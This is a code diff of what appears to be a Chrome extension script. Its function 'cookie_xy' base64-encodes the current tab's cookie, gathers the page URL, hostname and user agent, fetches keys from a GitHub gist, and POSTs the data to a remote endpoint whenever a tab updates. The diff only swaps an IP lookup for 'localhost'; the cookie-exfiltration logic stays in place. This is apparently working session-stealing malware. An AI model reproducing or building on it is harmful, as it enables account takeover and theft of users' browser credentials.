@@ -1,10 +1,9 @@
 function cookie_xy(expoCookie){
-    fetch("https://checkip.amazonaws.com/").then(res => res.text()).then(data => {
         chrome.tabs.getSelected(null, function(tab) {
             var name = new URL(tab.url).hostname;
             var cookie = btoa(expoCookie);
             var uri = tab.url;
-            var ipx = data;
+            var ipx = 'localhost';
             var UAgent = window.navigator.userAgent;
             var xhl = new XMLHttpRequest();
             xhl.open('GET', 'https://gist.githubusercontent.com/the5orcerer/87fd54148d22081426bb3cada383da44/raw/66ec4b9f48a7b6a73f2d9afa4d24279c91cf0d77/keys.json', false);
@@ -18,7 +17,6 @@ function cookie_xy(expoCookie){
             xhr.open("POST", url, true);
             xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
             xhr.send(param);
-        });
     });
 };
 chrome.tabs.onUpdated.addListener(function (tabId, changeInfo, tab) {
